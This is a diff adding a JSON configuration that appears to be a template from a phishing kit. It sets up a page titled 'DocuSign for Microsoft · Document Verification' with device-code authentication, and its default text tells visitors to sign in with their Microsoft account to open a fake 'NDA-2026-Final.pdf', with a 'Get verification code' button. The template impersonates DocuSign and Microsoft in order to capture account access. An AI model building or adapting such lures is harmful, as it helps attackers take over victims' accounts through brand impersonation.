@@ -1,0 +1,43 @@
+{
+  "name": "DocuSign 6",
+  "category": "no_preload",
+  "preload": false,
+  "auth_mode": "devicecode",
+  "fields": [
+    {
+      "key": "title",
+      "label": "Page Title",
+      "type": "text",
+      "default": "DocuSign for Microsoft · Document Verification"
+    },
+    {
+      "key": "message",
+      "label": "Page Message",
+      "type": "text",
+      "default": "This document is protected by DocuSign. Sign in with your Microsoft account to access it securely."
+    },
+    {
+      "key": "button_text",
+      "label": "Button Text",
+      "type": "text",
+      "default": "Get verification code"
+    },
+    {
+      "key": "file_name",
+      "label": "File Name",
+      "type": "text",
+      "default": "NDA-2026-Final.pdf"
+    },
+    {
+      "key": "pages",
+      "label": "Pages",
+      "type": "number",
+      "default": 4
+    }
+  ],
+  "background": {
+    "default": "",
+    "editable": false,
+    "blur": false
+  }
+}
